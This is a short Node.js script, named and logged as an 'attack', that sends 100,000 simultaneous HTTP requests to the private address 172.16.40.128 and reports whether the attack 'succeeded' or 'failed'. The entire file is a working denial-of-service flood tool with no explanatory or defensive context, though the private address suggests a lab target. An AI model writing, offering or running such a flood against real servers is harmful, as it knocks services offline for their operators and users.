const rp = require('request-promise')

const attack = () => {
  let request = 0
  const REQUESTS = 100000
  const promises = []
  
  while (request < REQUESTS) {
    promises.push(rp('http://172.16.40.128/'))
    request += 1
  }

  Promise.all(promises)
    .then(() => { console.log(`Attack succeeded with ${request} requests`) })
    .catch(() => { console.log(`Attack failed with ${request} requests`) })
}

attack()
